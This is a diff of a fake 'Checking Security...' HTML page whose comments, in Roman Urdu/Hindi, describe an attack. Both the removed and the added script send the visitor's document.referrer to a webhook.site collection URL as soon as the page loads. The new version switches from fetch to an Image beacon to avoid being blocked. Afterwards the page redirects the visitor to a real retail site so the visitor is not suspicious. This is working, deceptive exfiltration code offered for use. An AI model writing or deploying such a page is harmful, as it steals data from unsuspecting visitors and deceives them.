@@ -4,18 +4,25 @@
     <title>Checking Security...</title>
 </head>
 <body>
-    <script>
-        // Professional Attack: Jaise hi page load ho, data webhook par bhej do
-        // User ko kuch click karne ki zaroorat nahi
-        fetch("https://webhook.site/f0caaa7e-adb1-4d0f-bacb-a2bdf359ea28?stolen_data=" + btoa(document.referrer), {
-            mode: 'no-cors'
-        });
+    <h2 style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+        Connecting to Secure Server...
+    </h2>
 
-        // Phir user ko wapas asli site par bhej do taake usay shak na ho
+    <script>
+        // 1. Asli Hacker Trick: Image tag ke zariye data bhejna (No Block)
+        var leakUrl = "https://webhook.site/f0caaa7e-adb1-4d0f-bacb-a2bdf359ea28";
+        var stolenData = document.referrer; 
+
+        if (stolenData) {
+            var img = new Image();
+            // Hum data ko URL ke sath chipka kar bhej rahe hain
+            img.src = leakUrl + "?captured_url=" + encodeURIComponent(stolenData);
+        }
+
+        // 2. Phir user ko asli site par redirect kar dena
         setTimeout(function(){
             window.location.href = "https://www.cultbeauty.co.uk/";
-        }, 1500);
+        }, 2000);
     </script>
-    <h2>Connecting to Secure Server...</h2>
 </body>
 </html>
